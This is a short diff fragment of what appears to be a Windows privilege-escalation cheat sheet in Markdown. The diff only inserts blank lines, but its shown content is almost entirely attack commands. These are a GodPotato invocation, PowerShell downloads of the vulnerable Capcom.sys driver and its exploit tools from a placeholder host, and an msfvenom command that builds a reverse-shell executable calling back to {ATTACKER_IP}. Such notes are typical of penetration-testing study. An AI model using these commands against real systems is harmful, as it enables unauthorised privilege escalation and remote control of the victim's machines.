@@ -46,11 +46,13 @@ GodPotato -cmd "cmd /c whoami"
 ```
 git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege
 ```
+
 ```
 iwr "http://url:8000/Capcom.sys
 iwr "http://url:8000/LoadDriver.exe"
 iwr "http://url:8000/ExploitCapcom.exe"
 ```
+
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o rev.exe
 ```
